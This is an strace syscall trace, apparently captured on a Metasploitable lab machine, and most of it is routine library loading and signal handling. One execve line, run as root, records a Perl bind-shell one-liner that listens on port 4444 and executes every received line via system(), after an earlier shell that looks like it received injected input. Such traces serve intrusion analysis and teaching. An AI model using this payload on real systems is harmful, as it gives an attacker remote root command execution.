5777  07:10:39.059063 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5777  07:10:39.059079 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efb000
5777  07:10:39.059088 close(1)          = 0
5777  07:10:39.059099 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.059113 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
5777  07:10:39.059127 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5777  07:10:39.059214 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
5777  07:10:39.059231 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d4b000
5777  07:10:39.059274 mmap2(0xb7d53000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d53000
5777  07:10:39.059311 close(1)          = 0
5777  07:10:39.059339 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.059353 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
5777  07:10:39.059369 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5777  07:10:39.059475 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5777  07:10:39.059492 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d40000
5777  07:10:39.059503 mmap2(0xb7d49000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d49000
5777  07:10:39.059519 close(1)          = 0
5777  07:10:39.059540 munmap(0xb7efb000, 29913) = 0
5777  07:10:39.059556 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
5777  07:10:39.059571 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5777  07:10:39.059582 _llseek(1, 0, [0], SEEK_CUR) = 0
5777  07:10:39.059594 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
5777  07:10:39.059610 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f02000
5777  07:10:39.059620 _llseek(1, 1624, [1624], SEEK_SET) = 0
5777  07:10:39.059635 munmap(0xb7f02000, 1624) = 0
5777  07:10:39.059644 close(1)          = 0
5777  07:10:39.059672 getpgrp()         = 3831
5777  07:10:39.059682 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
5777  07:10:39.059697 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
5777  07:10:39.059713 brk(0x8101000)    = 0x8101000
5777  07:10:39.059755 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5777  07:10:39.059798 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5777  07:10:39.059813 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5777  07:10:39.059863 brk(0x8102000)    = 0x8102000
5777  07:10:39.059889 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5777  07:10:39.059908 stat64("/sbin/AB", 0xbf82ae78) = -1 ENOENT (No such file or directory)
5777  07:10:39.059920 stat64("/bin/AB", 0xbf82ae78) = -1 ENOENT (No such file or directory)
5777  07:10:39.059930 stat64("/usr/sbin/AB", 0xbf82ae78) = -1 ENOENT (No such file or directory)
5777  07:10:39.059942 stat64("/usr/bin/AB", 0xbf82ae78) = -1 ENOENT (No such file or directory)
5777  07:10:39.059955 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5777  07:10:39.059969 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d766f8) = 5778
5778  07:10:39.060013 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5778  07:10:39.060029 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5778  07:10:39.060042 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5778  07:10:39.060054 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5778  07:10:39.060069 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5778  07:10:39.060085 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5778  07:10:39.060097 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5778  07:10:39.060151 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
5778  07:10:39.060165 --- SIGPIPE (Broken pipe) @ 0 (0) ---
5778  07:10:39.060231 exit_group(127)   = ?
5777  07:10:39.075695 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5777  07:10:39.075696 --- SIGCHLD (Child exited) @ 0 (0) ---
5777  07:10:39.075696 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 5778
5777  07:10:39.075696 waitpid(-1, 0xbf82aaf8, WNOHANG) = -1 ECHILD (No child processes)
5777  07:10:39.075696 sigreturn()       = ? (mask now [])
5777  07:10:39.075717 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5777  07:10:39.075731 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5777  07:10:39.075742 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5777  07:10:39.075754 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5777  07:10:39.075772 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5777  07:10:39.075783 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5777  07:10:39.075821 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5777  07:10:39.075840 stat64("/sbin/perl", 0xbf82aea8) = -1 ENOENT (No such file or directory)
5777  07:10:39.075852 stat64("/bin/perl", 0xbf82aea8) = -1 ENOENT (No such file or directory)
5777  07:10:39.075864 stat64("/usr/sbin/perl", 0xbf82aea8) = -1 ENOENT (No such file or directory)
5777  07:10:39.075876 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5777  07:10:39.075893 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5777  07:10:39.075917 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5777  07:10:39.075932 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d766f8) = 5779
4519  07:10:39.075970 waitpid(5777,  <unfinished ...>
5779  07:10:39.095764 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5779  07:10:39.095765 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5779  07:10:39.095765 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5779  07:10:39.095765 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5779  07:10:39.095767 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5779  07:10:39.095784 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5779  07:10:39.095797 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5779  07:10:39.095835 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
5779  07:10:39.095931 brk(0)            = 0x8153000
5779  07:10:39.095953 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5779  07:10:39.095970 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efe000
5779  07:10:39.095985 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5779  07:10:39.096002 open("/etc/ld.so.cache", O_RDONLY) = 1
5779  07:10:39.096015 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5779  07:10:39.096068 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ef6000
5779  07:10:39.096080 close(1)          = 0
5779  07:10:39.096091 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5779  07:10:39.096121 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5779  07:10:39.096135 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5779  07:10:39.096225 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5779  07:10:39.096242 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ef2000
5779  07:10:39.096254 mmap2(0xb7ef4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ef4000
5779  07:10:39.096270 close(1)          = 0
5779  07:10:39.096282 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5779  07:10:39.096295 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
5779  07:10:39.096316 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
5779  07:10:39.096402 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
5779  07:10:39.096418 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ecd000
5779  07:10:39.096430 mmap2(0xb7ef0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7ef0000
5779  07:10:39.096446 close(1)          = 0
5779  07:10:39.096457 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5779  07:10:39.096471 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
5779  07:10:39.096485 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
5779  07:10:39.096623 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
5779  07:10:39.096640 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ecc000
5779  07:10:39.096653 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eb4000
5779  07:10:39.096664 mmap2(0xb7ec8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7ec8000
5779  07:10:39.096678 mmap2(0xb7eca000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eca000
5779  07:10:39.096692 close(1)          = 0
5779  07:10:39.096704 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5779  07:10:39.096717 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5779  07:10:39.096731 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5779  07:10:39.096820 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5779  07:10:39.096838 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d65000
5779  07:10:39.096849 mmap2(0xb7eae000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7eae000
5779  07:10:39.096863 mmap2(0xb7eb1000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eb1000
5779  07:10:39.096876 close(1)          = 0
5779  07:10:39.096888 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5779  07:10:39.096901 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
5779  07:10:39.096915 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
5779  07:10:39.097002 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
5779  07:10:39.097019 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d33000
5779  07:10:39.097039 mmap2(0xb7d3c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d3c000
5779  07:10:39.097080 mmap2(0xb7d3e000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d3e000
5779  07:10:39.097094 close(1)          = 0
5779  07:10:39.097131 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d32000
5779  07:10:39.097144 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d328c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5779  07:10:39.097204 mprotect(0xb7eae000, 4096, PROT_READ) = 0
5779  07:10:39.097230 munmap(0xb7ef6000, 29913) = 0
5779  07:10:39.097243 set_tid_address(0xb7d32908) = 5779
5779  07:10:39.097252 set_robust_list(0xb7d32910, 0xc) = 0
5779  07:10:39.097262 futex(0xbfbb8050, 0x81 /* FUTEX_??? */, 1) = 0
5779  07:10:39.097277 rt_sigaction(SIGRTMIN, {0xb7eb82c0, [], SA_SIGINFO}, NULL, 8) = 0
5779  07:10:39.097290 rt_sigaction(SIGRT_1, {0xb7eb8340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
5779  07:10:39.097302 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
5779  07:10:39.097316 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
5779  07:10:39.097334 uname({sys="Linux", node="metasploitable", ...}) = 0
5779  07:10:39.097380 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
5779  07:10:39.097430 brk(0)            = 0x8153000
5779  07:10:39.097439 brk(0x8174000)    = 0x8174000
5779  07:10:39.097484 getuid32()        = 0
5779  07:10:39.097494 geteuid32()       = 0
5779  07:10:39.097503 getgid32()        = 0
5779  07:10:39.097512 getegid32()       = 0
5779  07:10:39.097523 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d11000
5779  07:10:39.097523 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
5779  07:10:39.097523 read(1, "\273\313V\217", 4) = 4
5779  07:10:39.097524 close(1)          = 0
5779  07:10:39.097524 time(NULL)        = 1495624239
5779  07:10:39.097524 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfbb7d20) = -1 ENOENT (No such file or directory)
5779  07:10:39.097540 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfbb7d20) = -1 ENOENT (No such file or directory)
5779  07:10:39.097553 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfbb7d20) = -1 ENOENT (No such file or directory)
5779  07:10:39.097569 stat64("/usr/local/lib/perl/5.8.7", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097581 stat64("/usr/local/share/perl/5.8.7", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097593 stat64("/usr/local/lib/perl/5.8.6", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097605 stat64("/usr/local/share/perl/5.8.6", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097616 stat64("/usr/local/lib/perl/5.8.4", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
